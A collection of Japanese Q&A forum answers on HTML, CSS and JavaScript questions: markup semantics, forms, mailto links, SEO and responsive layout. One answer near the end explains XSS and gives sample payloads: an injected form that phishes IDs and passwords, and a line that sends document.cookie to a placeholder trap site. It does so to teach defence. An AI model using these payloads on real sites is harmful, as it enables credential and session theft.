htmlはタグを用いてその語句に意味を与えます。 ご存知のように、pは段落を意味し、aはリンクを意味します。 従って、ボックスとして囲みたい文字がどのような意味を持つのかでマークアップすることをおすすめします。 たとえば、その語句を強調したいのであれば、strongやemが有効です。また、特に意味を与えたくない場合、あるいは意味がないことを明示的にするにはspanなどを用います。 また、他の回答者さんと意見が分かれますが、html5からはブロックレベル要素、インラインレベル要素の隔たりがなくなりました。つまり、ブロックレベル、インラインレベルは装飾(CSS)だけの問題であって、HTML構造的には意味を持ちません。たとえば、aタグの中にpタグを入れることができます。他の回答者さんと真逆のことを書いていますが、他の回答者さんはおそらくXHTMLについて述べられていると思います。HTML5はまだ勧告の状態ではありますが、個人的にはXHTMLはもう古いのではないかと思います。
ホームページビルダーを使って。という方法ではありませんが、.htasccess という特別なファイルを作ってこれをサーバ上に設置することで、自動転送させることが可能です。 http://allabout.co.jp/gm/gc/23770/ 細かい文法などは少し難しいのですがこういうところを見て調べるとよいかと思います。 http://htaccess.cman.jp/
headの前にscriptを書いても、ただheadの省略とみなされてその直前からheadが始まってると解釈されるだけです。 headの前に記述しても、あくまでheadの中に存在するのは変わりません。 そもそもasyncを指定してるのにページの初期レンダリングに影響が出たら、それはよっぽど非力で異常な環境なのか、スクリプトがおかしなことをしているかです。 気のせいだと思いますよ。
HTMLのバージョンによって異なりますが、 リンク先をHTMLで特定して、そこにリンクする。 -------------------------- 特定する方法は <a name="Target1">ここ</a> <h1 id="Target2">ここ</a> のふたつの方法があります。 正確な情報は 　⇒12.1 リンクとアンカーの概説( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　　12.2.3 id属性によるアンカー( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
　tableは、「二次元以上のデータを表すもの」です。よって、列や行の変更はできません。あってはならない。 ★単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　tableでないのでしたら、御随意に、変更してください。floatで回り込ませようと、mediaquery使おうと・・ 　利用するのはPCやスマホといったscreenメディアだけじゃない 『HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』さらに検索エンジンも考慮しなければならない。 　印刷(media="print")、携帯電話(media="handheld")、読み上げブラウザ('aural''speech')とかも無視はできないです。 　
逆の立場で考えると容易に理解できると思います。 1) あなたが、"カブトムシの採集方法"を探したいとします。 2) googleは、自身の持つインデックスからその内容に最適なページを見つけて表示します。 ★誰かが、この時期は"カブトムシの採集方法"で探す人が多いので、本来のページの中身はリゾートホテルなのに、descriptionやkeywordに、この語句を埋め込んだとします。 　あなたは、そのkeywordやdiscriptionにしたがってリゾートホテルのページが出てくるのと、カブトムシの採集方法のいずれが検索結果に出てくるほうが良いですか？？？ 　googleは、ページの本来の内容を理解して、keywordやdiscriptionの内容と照合し!!!、より適切な物を表示しますし、不一致が【悪意】だと判断するとSPAMと認識します。 HTML5ですから、ページの内容は理解しやすくなっています。なぜなら・・ <header> 　<h1>ページタイトル</h1> 　・・・文書のヘッダ・・ 　<nav>ナビゲーション</nav> </header> <section> 　<h2>見出し</h2> 　・・・このページの本文・・・ 　　<section> 　　　<h3>項目</h3> 　　　・・・サブ項目・・ 　　　<aside>本文とは直接関係ない記事</aside> 　　</section> 　<nav>・・このページの目次</nav> </section> <footer>この文書のフッタ</footer> のように、文書構造が検索エンジンに伝わるようにマークアップされていると思います。 　⇒HTML5 における HTML4 からの変更点/新しい要素( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　⇒HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT/文書内に埋め込まれた「意味」を明確にする( http://www.atmarkit.co.jp/ait/articles/1008/30/n … ) 注) HTML4.01では、<div class="header"><div class="section"><div class="aside">のように『DIVやSPANは、id属性及び class属性と併用することで、文書に構造を付加( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』してこられたと思いますが、HTML5では新しい要素で示すことができるようになった。【かわりにしDIVは原則使わないことになりました。】 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Note: Authors are strongly encouraged to view the div element as an element of last resort, for when no other element is suitable. ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［4.4 Grouping content — HTML5( http://www.w3.org/TR/html5/grouping-content.html … )］より SEO:検索エンジン最適化(Search Engine Optimization) ・検索エンジンにそのページの内容・主題が正確に理解できるようにマークアップすること 　・・それによって検索順位の上位に表示されるし、概要を正確に示してくれる。 　　これはあくまで、結果であって本来のSEOは「そのページの内容・主題が正確に理解できるようにマークアップすること」 　これであなたの疑問の答えは分かると思います。 1) ページの内容が正確に検索エンジンに理解されているか？ 2) それとkeyword,discriptionが一致しているか 　　　一致しなくて、悪意がないと判断されない場合は内容を表示する。 ★基本中の基本 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから ・検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。 ・ユーザーをだますようなことをしない。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン（品質に関するガイドライン） - ウェブマスター ツール ヘルプ( https://support.google.com/webmasters/answer/357 … )］より　 ＞description"の内容は英語で書いてます。 　なぜ？？lang="ja"のページで英語を書いても意味無い。 　また、それと表示結果は関係ない HTML5ですから、 ・きちんと文書構造を示す要素を使ってマークアップすること 　(どこが主題であるかをマークアップすること <main>要素をつかってもよいかも http://www.w3.org/TR/html5/grouping-content.html … ) ・ページの内容（要約）と一致するdiscriptionを記述する。 　論文を書くときのabstractを書くつもりで 　keywordは、googleはそのページがSPAMか否かを判断する目的以外には使ってないようです。 　記述するなら、内容に正確に一致させること 　そしてなによりも『検索エンジンではなく、ユーザーの利便性を最優先に考慮してページを作成する。』
というか、元々HTMLの最大の目的は!!! 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる 　・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　なのですからね。 ＞携帯用のページ、パソコン用のページと二つのページを作ればいいのでしょうか？ 　それをしないためのHTML/CSSなのです。 様々な解像度や色深度のグラフィックディスプレイを持つPC、スマホなど →　media="screen" 携帯電話、モバイル機器 →media="handheld 音声入出力機器 →media="speech" 印刷機 →media="print" さらに、それぞれ様々な解像度/サイズがある 　それに対してたった一つのHTMLで記述できるのがHTMLの最大の利点であり、そのためにHTMLを使ってウェブページを作成するのですよ。
３等分と２等分の最小公倍数は６です。 ６列にすればcolspanを使わなくていいです。 <table width="952" border="1" cellspacing="0" cellpadding="0" class="test"> <tr> <th width="80">項目1</th> <td width="235"><input name="" type="text" value="12345" /></td> <th width="80">項目2</th> <td width="235"><input name="" type="text" value="12345" /></td> <th width="80">項目3</th> <td width="235"><input name="" type="text" value="12345" /></td> </tr> <tr> <th>項目4</th> <td colspan="2"><input name="input2" type="text" value="12345" /></td> <th width="80">項目5</th> <td colspan="2"><input name="input3" type="text" value="12345" /></td> </tr> </table>
FORMタグに target="_blank" を入れて試してみましたか？
一旦htmlごと消して、再度追加という方法で入れ替えてしまいましょう。 http://www.ilovex.co.jp/blog/system/i/cat818/jav … http://www.arcanaworks.jp/tips/jqueryでformのinput-typefileをリセットする方法/
IE8以下を区別するもの。 この場合、「￥」では無く「＼」の意味で使われます。 ※半角「￥」と半角「＼」は同じ文字コード。 「CSSハック」で検索すれば色々出てくるでしょう。
ダウンロードしないと、ブラウザで使うことはできないので、必ずダウンロードされます。 ただ、ここで言うダウンロードとは、「データを受信する」という意味です。 それを必ずファイルとして保存するか、というと、そうとも限りません。 キャッシュの話が出ていますが、「メモリキャッシュ」というものもあります。 ファイルではなく、メインメモリに保存するものです。 また、キャッシュへの保存方法も、ダウンロードしたまま、とは限りません。 圧縮、暗号化等の加工を施している場合もあります。
No.2 の補足に対して 属性 required を使っているので、HTML5 で回答します アレ = ある条件、の対象となるタグ コレ = 指定の項目、のタグ とすれば、 var form = document.forms[アレとコレを含むフォームのname] form.elements[アレのname].addEventListener('change', createHandler(条件を満たすアレのvalue, コレのname), false); なので、 var form = document.forms['form01'] form.elements['jyoukyou'].addEventListener('change', createHandler('対応済', 'syuuryoubi'), false); それはそうと 誤: <option value="..."/> ... </option> 正: <option value="..."> ... </option>
あくまでHTMLだけで作った場合の質問なのか悩んでしまいましたが、追記します。 > 私も最初は相対パスで記述しており、途中でルート相対パスに変更してみたのですが、ローカルでは正> しくリンクしない事に気が付きました。 現在作成されているものがHTMLだけで構成されるならば、環境によっては、ルート相対パスは向かないと思います。 確認されている通り、開発環境と本番環境で異なる為です。 具体的に言うと、開発環境にWebサーバを立てていない場合。 開発環境におけるルート相対パスは、Webサーバを立ててこそ意味があります。 XAMPPでもApache単体でもいいから、インストールした上でDocumentRoot配下で開発を行っていれば、恐らく支障ありませんよ。 その環境を作らないと、作ったソースを丸々本番サーバでアップロードできません。 そういう意味では相対パスは、パス指定を簡素化できればWebサーバいらずですね。 プログラムを走らせる為、どの道Webサーバを立てないと動かせないようなサイトなら、まぁどっちでも好みの問題で、という次元が少なからずあると思います。 どちらでも走りますので。 ルート相対パスも相対パスも、参照するパスがやたら長ったらしいと煩わしい。 ミラーサイトが作成されるという懸念については、クライアントに全ソースをダウンロードしている以上、防ぎようがありません。 簡単だろうが難しかろうが、サイトのコピーは不可能ではないと考えていいです。 つまり、考えるだけ無駄です。 コピーされるのが嫌ならそもそもネット上に公開しない、特定の人物やドメインにのみ許可するなどの対応となるでしょう。 考えるのは、コピーを防ぐ方法よりは、コピーされた後の対応になると思います。 しかしそれも、動的ページ(PHPやらJavaやら使って)なら、クライアントに見えるのは描画が完了したページだけですから、丸ごとクローンというわけにはいかないでしょうね。
そのままのHTMLでしたら単純に input[name="figure"]{position:relative;left:30px;top:-20px;margin-left:-20px;} ＞できれば、大きさも変えたいと考えています。 ★inputなどUI(ユーザーインターフェースに関わる部分はデザインを変えてはなりません。 HTMLが不正なので、ちゃんとマークアップすれば変わります。
td.class2 .class3 a { color:#FF0009/*文字の色を指定*/ } こんな複雑な構造の物で練習しないで、もっと簡単な物で練習する事をお勧めします。
プログラムって……何をおっしゃっているのかがわからないのですが。 >　ttp://www.ietf.org/rfc/rfc6068.txt >　のプログラムはどこにあるか分かりません・！？ 見ましたが、これは単にRFCの説明文です。mailtoというURIスキームはどういう働きをするものか、の説明です。プログラムのことなど何も書いてありませんが……。 何か勘違いされているんじゃないでしょうか。
貴方のブラウザでポップアップを禁止しているだけでしょう。 それともjavascriptを禁止されているか？ 　不調なのではなく、貴方がそう設定しているだけです。 　このようなナビゲーションは、ページを作成するときには作ってはなりませんね。
img要素は置換インライン要素で、そのサイズは置換される要素のサイズに依存する。 　ここは良いですよね。 画像 640px×480px を用意して・・ <img src="[URL]" width="420" height="360" alt="テスト画像"> のような、HTML要素の属性として指定されていると、これに従います。 　詳細度は0ですから、スタイルシートで指定されていると上書きされます。 [ユーザーの最重要宣言]＞[著者の最重要宣言]＞著者の宣言＞ユーザーの宣言＞ブラウザの指定 　同じ詳細度だと、後出のもので上書きされます。 ＞heightの指定が無視されて困っています。CSSの設定でheightだけ無効 　heightが無効になっているので、「無視される」でよいのでは？？？ 　　質問の意味が不明です。 　
mailto schemeのbodyは，メールの最初のtext/plainパートであると決められています。 ref) http://www.ietf.org/rfc/rfc6068.txt > 2. Syntax of a 'mailto' URI (省略) > The special <hfname> "body" indicates that the associated <hfvalue> > is the body of the message. The "body" field value is intended to > contain the content for the first text/plain body part of the > message. text/plainなので，色などの装飾情報を含むことはできません。
URL の相対指定の一種で、 URL が使用されている場所と同じスキーム(プロトコル)が使用されます。 仕様にも明記されています RFC 3986 / 4.2. Relative Reference これを使うことのメリットとしては http と https の両方で表示できるページにて、 スクリプトや画像を取得する際のスキームを簡単に統一できる点です。 https のページから http のアクセスは、 セキュリティな観点からブラウザが警告を発するのですが、 使用するスキームを統一すればこの問題は発生しません。 よって、埋め込み型の URL は全てスキームを省略する様に推奨している会社もあります http://google-styleguide.googlecode.com/svn/trun …
「フォームで文字数や未入力などをチェックするために、Validationでチェックさせようとしました」とありますが、これはどうやってるのでしょうか。 また、「W3C Markup Validation Serviceはオフラインでは使用できないのですか？」とありますが、W3C Markup Validation Serviceは、HTMLのソースコードがHTML標準に準拠して書かれているかどうかを調べるもので、フォームの内容をチェックするものではありません。
a href=""の値はHTTPプロトコル以外は指定されていなくて、あくまでブラウザにMUA(メールユーザーエージェント)が指定されている必要があり、また指定されていても制約が多いです。 　そのうえで、ブラウザ、メーラーが同じ条件での簡易的方法として mailt: に複数のアドレスを,で区切って <a href="mailto:山田&lt;Campus2★hoge.com&gt;,田中&lt;test★hoge.com&gt;">メール</a> のようにすれば良いはず。 ★は半角のアットマーク
回答No.1です。 訂正します。 ごめんなさい。 気になって文字列でググってみました。 画像のあるなしは関係ないようです。 二重投稿された方が、片方は文字化けを起こしているページを発見しました。 私自身の経験では、mixiではこのような文字化けはよく見ます。 文字化けを連投でよく投稿するマイミクがいるんです(^_^; 彼女はいつも画像を投稿しては、失敗して連投して文字化けになっているので、 ついつい画像データだと思い込んでいました。 あまり気にしていないので、原因は聞いたことはないです。
カーボンコピー(CC)や、ブラインドカーボンコピー(BCC)知りませんか？ 参考にされてるurlにも書かれていますけど。
HTMLにするか、XHTMLにするか・・ 　つい数年前までは、W3CもHTMLは4.01で終了し、今後はXHTMLに移行すると宣言し、 HTML4.01 　そのままXML構文にあわせた 　　XHTML1.0 strict、XHTML1.0 transitional、XHTML1.0 frameset 　そして、予告どおりstrict以外を廃止した 　　XHTML1.1 　そして、XHTML2.0の策定を進めていましたが、W3Cの方向性に反対するWHATWGが独自にHTML5の策定を進め始めた。世界はXHTMLを支持せず、HTML5に向かい始めた。そのためW3Cは前言を翻して、XHTML2.0の策定を中止して、一緒にHTML5に進み始めた。 詳しくは、 ★HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html ) ---「難しい技術は広く使われない」---- 以下は、"HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/n … )"より 【問題1】Webブラウザ間の互換性が低い 【問題2】文書内に埋め込まれた「意味」が不明確 　　これは、HTML4.01のときにすでに『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』とされていたはずなのに無視されてきた。 【問題3】Webアプリの機能が制限されている その反省から、HTML5は作られてきました。 私が示したサンプルは、HTML5の新しい要素をclass名などに取り入れた形になっている。 　将来を考えると現状ではHTML5を念頭において、HTML4.01strictが一番簡単でしょう。 ＞１分単位なので1440個のＴＤになってしまいます。 　それでしたら、table、特にtdは使いません。tableの描画は時間がかかります。 <div class="schedule"> 　<h2>週間予定</h2> 　<dl> 　　<dt>月</th> 　　<dd> 　　　<span class="noneOrder S0630 H0230 E0900">101</span> 　　　<span class="ordered S0900 H0100 E1000"></span> 　　　<span class="noneOrder S1000 H0150 E1050">102</span> 　　　<span class="ordered S1050 H0300 E1350"></span> 　　　　・・・とかのほうが楽でしょうね。・・classの中身は適当(後々使うかもしれないので)・・ 　　</dd> ☆HTMLの仕様では、idには ・先頭がアルファベットで始ま。 ・2文字目以降にはアルファベット、数字、ハイフン(-)、アンダースコア(_)、ピリオン(.)、コロン(:) 　class名には制限はないのですが、スタイルシートで使う場合はclass名にも ・一文字目はアルファベット、アンダースコア(_) ・二文字以降はアルファベット、数字、ハイフン(-)、アンダースコア(_) 　と言う制限が加わります。
XAMPPでFTPサーバーってインストールされないんじゃないですか？FTP接続はFTPサーバーが動いてないと使えませんよ。SFTPならSSHサーバーが動いてないと使えないです。 もしもその辺りをちゃんと勉強したいなら、LinuxでFTPそのほか各種サーバーの立ち上げ方を教えてくれる本が4000円位で売っているので、読んで見てください。
【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから action = uri [CT] 　この属性は、フォーム処理エージェントを指定する。HTTPスキームURI以外の値の場合のユーザエージェントの動作は、定義しない。 method = get|post [CI] 　この属性は、フォームデータ集合を提出する際にどちらのHTTPメソッドを用いるかを指定する。 可能な値は、大文字小文字を区別せず、「get」(デフォルト値)と「post」である。使用法については フォームの提出の項を参照のこと。 enctype = content-type [CI] 　この属性は、(method属性値がpostの場合)サーバに提出する際のMIMEタイプを指定する。 デフォルト値は "application/x-www-form-urlencoded"である。 INPUT要素でtype="file"のものと組合せる場合は、この値に "multipart/form-data"を指定する必要がある。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　仕様書くらいは、一度通して読んでおきましょう。 　よって、かならず <form action="/cgi/mailForm.cgi" method="post" enctype="multipart/form-data"> 　になります。 　・デフォルトのGET(Querystring)の許容量をオーバーします。 　CGI側で、画像の処理をします。Perlが使えれば、多くの場合ImageMagickないしPerlMagickが使えますので、メールで扱える範囲内にデータを縮小するなりして送信すれば良いです。 　https://www.google.co.jp/?gws_rd=ssl#q=%E3%83%95 …
半角カナというのは昔の規格なので、 特定の目的以外では使わない、で間違いありません。 * 互換性の維持 / 例: http://www.excite.co.jp/News/bit/00091197207609. … * データ量の節約 / 例: http://wifi.yahoo.co.jp/special/april201404 ですが全角記号というものは少々事情が異なりまして... Unicode が普及した現在では、全角記号は互換性のための存在なので、 基本は半角と考えておけばよいと思うのですが... 目的によっては全角もバリバリ使います。 * 日本語組版としてベタ組みさせるために、全角 * 縦組み印刷時に横倒しをさせないために、全角 泥臭い話として、HTMLを処理するシステムの都合でどちらを使うか決まる場合もあります。 * XSS対策として、文章中の半角入力が不可能なので、全角 * バックエンドが全角半角混在ができないシステムなので、全角 * 文末の半角記号を特別処理する欧米系システムなので、半角 というわけで、 掲載するサイトにてルール化されているか確認してください / 例: http://ja.wikipedia.org/wiki/Wikipedia:表記ガイド ルールがない場合、出版を念頭に置いた日本語文章なら、全角がよいでしょう それ以外の場合は、半角がよいでしょう
＞htmlの知識だけではできないですよね？ 　できません。 　ただ、文字化けや制約、および大量のスパムメールを厭わなければ、<a href="mailto:メルアド?subject=件名">メール</a>で出来なくはないですが、 ・mail:プロトコル(手続き)には、厳しい制約があります。 　文字は原則 ASCII(アルファベットと数字、一部の記号)しか送れない。 　日本語はiso-2022jpで、ヘッダにはBASE64エンコードが必要 　一行は64文字程度(ASCII換算) 　など ・メールアドレス収集ロボットでメールアドレスを取得されます。 　よって、CGIなどのプログラムを使用する必要があります。 　ウェブサイトをお持ちでしたら、そのサービスを提供しているプロバイダーに用意されていませんか？？ 　なければ、どこからか拾ってくる。 　フォームメール CGI( https://www.google.co.jp/search?q=%E3%83%95%E3%8 … )
ローカルへの保存といっても、テキストファイルのような形でSDカードに保存するようなやり方はちょっと難しいでしょう。 そもそもWebに搭載されているJavaScriptというのは、ローカル環境へのアクセスを厳しく制限して作られています。だって、スクリプトでファイルを保存できるようになっていたら、例えばシステムの起動ディレクトリにウイルスファイルを保存したり、システムのファイルを書き換えたりできるってことでしょう？　それはあまりに危険です。 というわけで、JavaScriptのスクリプトをちょっと書き換えてローカルに保存できるようにする、という考え方は捨てて下さい。方法としては、以下の３つのいずれかがいいと思います。 1. サーバーに保存する サーバーを立ててそこにデータを送信し、保存する。そこからデータをダウンロードすることは可能です。このやり方なら、ローカルにファイルとして保存できます。ただし面倒。 2. ローカルストレージを使う JavaScriptでは、テキストに名前をつけて保存しておけます。こんな感じです。 localStorage.setItem("名前", 保存するテキスト ); これで保存したものは、ブラウザを終了した後も保存して残ります。消えたりはしません。取り出すときはこうします。 var 変数 = localStorage.getItem("名前"); これで、指定した名前で保存したテキストが取り出せます。テキストを取り出すためのページを作って、そこにアクセスして表示するようにすれば便利でしょう。個人的には一番てっとり早くておすすめ。 3. テキストを表示して手作業で保存する 新しいページを開いてテキストを表示し、それを手作業で保存する、というやり方はあるでしょう。Android 4.0以降なら、オフライン用に保存できるので、Webページとして保存しておくというやり方ができます。例えば、こんな感じ。 var newwin = window.open("", ""); newwin.document.open(); newwin.document.write( 表示するテキスト ); newwin.document.close(); これでテキストを表示したページが開かれますから、それを保存すればいいでしょう。
推奨できるかどうかはともかく、とりあえずinline <style> td div{display:inline;font-size:50%;} </style> <table border=1 cellspacing=1 cellpadding=1> <tr><td>a<DIV>50%です</DIV></td><td>b</td></tr> <tr><td>c</td><td>d</td></tr> </table>
File APIでどうでしょうか。 http://www.html5rocks.com/ja/tutorials/file/dndf …
サーバーから見ると、スマホも携帯もすべてパソコンなので、単に拒否すればよいのですが？？ order deny,allow deny from all
<p> 氏名：<input name="ans1" value=""> </p> <p> 困った点：<textarea name="ans2" rows="4" cols="40"> 自由に意見を記述してください。そのときの写真を下の箱に入れてください。 </textarea> </p> <p> 困ったときの写真： <input type="file" name="ans3"> </p> でよいです。段落違うので<br>じゃなく<p></p>でマークアップしましょう。内容のない要素の最後が/>になっていますが、それだとXHTMLになります。当然、要素、属性は小文字でなければなりません。 　まあ、上記のようにHTMLでかかれるほうが楽でしょう。 　このままでは画像は表示されませんから、 1) <form action="[URL]" method="post" enctype="multipart/form-data"> 　として一旦サーバーに送信して、サーバーの画像処理プログラムでサムネイルを作成して、それを確認画面で 　<p><img src="" width="" height="" alt=""></p> 　として表示させる。 2) <form action="[URL]" method="post"> 　　デフォルトのenctype="application/x-www-form-urlencoded"になります。 　で一旦送信させて、[パスを取得し]確認画面で、 <input type="file" name="ans3" value="[パス]"> <input type="file" name="ans3-1" > 　とする。 3) javascriptを用いて、<input type="file">の値を取得して、HTMLソースを書き換える。 　などの方法があるでしょう。 　(1)が最も楽だと思います。サイズ変更なども含めて、画像処理にimagemagickなどのサーバーサイドのプログラムを使用すると良いでしょう。
ちなみにどんなアプリでも、HTML、CSS、JSの合計は2～5MBに収まると思います。 canvasを使用している場合はHTMLとCSSがほぼ0になりますが、その分JSが増えますので、合計はほとんど変わりません。 GoogleDocumentで1.5MBくらいだと思います。 GoogleDocumentはほとんど画像が使われていない（小さなアイコンのみ）ため、全体のアプリサイズも小さいです。 以下はウェブページの話ですが、 ウェブページならサイトの規模にもよりますが、SNSやポータルサイトでは画像も含めて1～2MBが標準的だと思います。 たとえばOKWaveのトップページは1.3MBです。 ランディングページの様に大量の画像を並べて5MB以上ある物もありますが、 「人間が記事を読むスピード」の関係でダウンロードが少々遅れても問題ないこともありますので、一概には言えません。
gooブログでアップロード出来るファイルは画像形式のみです。 JavaScriptは許可されてるので、他のオンラインストレージを借りて、 そこにPDFをアップしてそこにリンクするとか。 ただ、私もポップアップは感心しませんね。 嫌う人もいますから。
mailtoでできるのはメーラーをむりくり開くくらいなので ちゃんとやりたいならフォームメール的なサーバーサイドのプログラムが 必要になるでしょう
　一言で言うと、ユーザーインターフェースに関わる部分は変更してはなりません。 訪問者は、少なくともユーザーインターフェースは変わらないと期待しています。時々見かける、マウスポインターが本来のものと異なるサイトに行った時に、あなたは違和感を感じませんか？？ 　すべてのユーザーが画像を読んでいる訳ではありません。かならずalt属性で具体的な内容を示しましょう。 　位置を変えるだけなら、属性セレクタ使って・・ form input[name="riyu"]{position:relative;left:30px;top:-10px;} form input[value="3"]{left:40px;top:-5px;}
おなじページ内でよければこんな感じ？ <script> try{ document.addEventListener ('keyup',function(e){keyupfunc(e)},true); }catch(e){ document.attachEvent('onkeyup',function(e){keyupfunc(e)}); } function keyupfunc(e){ var t = (e.srcElement || e.target); if(t.nodeName=="INPUT"){ switch(t.name){ case "ans1": t.form.elements["ans5"].value=t.value; break; case "ans5": t.form.elements["ans1"].value=t.value; break; } } } </script> <form> <p> 質問１　氏名：<input type="text" name="ans1" /> 質問５　氏名：<input type="text" name="ans5" /> </p> <form>
質問1; No2さんの通り、'>"><hr> はタグが有効か簡単に確認する方法というだけで、<hr>に特に意味はありません。。 <hr>が表示される、つまり「タグや引用符が処理されていない」ということは、「そのページを改竄できる」ということを意味します。HTML部品を勝手に挿入される、といった方が分かりやすいかも知れません。 例えば、悪意者がブログで勝手にあなたのサイトを紹介し <a href="http://あなたのサイト/フォーム.php?name=></form> <form action='http://罠サイト/IDget.php'> ID<input name='id'>PASS<input name='passwd'>"> [このサイトがおすすめ] </a> こんな感じで不正なタグ入りのクエリ付きリンクを張られます。 (</form>で正規のformは無理やり終了、続いて不正なフォームを挿入している) これを誰かがクリックすると「その利用者には改竄されたあたなのサイト」が表示されます。 他 display:none 等で正規のformは非表示にされ、しかも「 URLはあなたのサイトのまま 」なので、利用者はまず気付かずに罠サイトに送信してしまいます。カード情報や個人情報だと被害は甚大です。 質問2; alert()の方も、単にJavaScriptの可否を簡単に確認する方法、というだけです。 「alert()が動作する」ということは、大抵「JavaScriptの挿入可」ですので例えば location.href="http://罠サイト/get.php?cookie="+document.cookie; なら分かりやすいでしょうか。悪意のサーバ宛てにその利用者のクッキーを送信してしまいます。 クッキーには自動ログインの為の値やセッションIDが入っている事が多く、なりすましに利用されます。 実際には <img src=～とかで目に見えないところで送信されたり、あるいは <script src='～/xss.js'>などで不正なJavaScriptを背後で実行されるかも知れません。 ※Q1,2共に、あなたのサイトそのものが改竄されるわけではなく、「罠リンクを踏んで来訪した利用者に、正しいURLのままで、改竄されたページが表示される」ということです。 セキュリティ本1冊目を通されることをお勧めします。 徳丸 浩氏の 「安全なWebアプリケーションの作り方」が実際の手口も掲載され理解しやすくお勧めです。
すくなくともHTMLにはそのような書き方は許されていません。 Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) のDATA(右上)かURLを入れて確認してご覧なさい。 <hr>は罫線ですが、HTML5以降は The hr element represents a paragraph-level thematic break, e.g. a scene change in a story, or a transition to another topic within a section of a reference book. 「hr 要素は、段落レベルのテーマの変わり目を表します。例えば、物語の中でのシーンが変わる場面や、参考書の内容を示している時に他のテーマに変化した場所」 ※よって、見出し<h1>～<h6>を伴うsectionの境界には使う事は出来なくなります。 HTML4.01風に書くと <div class="section"> 　<h2>ここは説明</h2> 　<p> 　　hr 要素は、段落レベルのテーマの変わり目を表します。例えば、物語の中でのシーンが変わる場面や、参考書の内容を示している時に他のテーマに変化した場所 　</p> 　<hr> 　<p> 　　※よって、見出し<h1>～<h6>を伴うsectionの境界には使う事は出来なくなります。 　</p> <div> <hr><!-- HTML5では、ここには使えない。なぜならsectionが変わることが明々白々なので --> <div class="section"> 　<h2>・・・・
＞選択なしの強制で変換させる方法はありますでしょうか。 　高解像度のスマホだとPC用で良い人もいるでしょうし、そもそも今後登場するであろうすべてのスマホに対処し続けられますか？ ＞パソコンで見る様にデザインしてるのでスマートフォンで見ると見にくくて困っています。 　そもそも、この時点で大きな問題があるのでしないですか？ 　わざわざ、PDFじゃなく、HTML使ってウェブページ(ホームページじゃないと思う)を作る理由は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 ・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　HTMLを利用する環境は、screenメディアであるPCやスマホだけじゃありません。携帯電話での利用や印刷して利用する人、目の悪い人は文字を大きくして利用するかもしれませんし、スクリーンリーダーや点字出力を利用するかもしれません。★そもそも検索エンジンの訪問も考えなければなりません。 　そのためにHTMLを利用してウェブページを作成するのです。 ★その原点を忘れてませんか？ 1) 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　まず率直に文書構造だけをHTMLでマークアップします。 　(注)ブラウザ間の誤差を極力排除するために、strictで作成し、DOCTYPEはブラウザが標準モードで動作するように記述します。 2) その文書構造を元にスタイルシートでプレゼンテーションを指定していきますが、スマホを含め様々なディスプレイを対称にする場合はリキッドでデザインしていきます。 　まったくスタイルシートを書かない状態だとブラウザのもつデフォルト(初期)のスタイルはリキッドです。それをわざわざ、端末の制約の多い固定サイズにしてしまうことが、いわば諸悪の根源なのです。 　例えば、width:100%;max-width:1000px;margin:0 auto;(min-width640px;)とするだけでよいはずです。 3) そのうえで、スマホに対してmediaqueryでデザインを変更する。 　これで、すべての問題は解決するはずじゃないかと
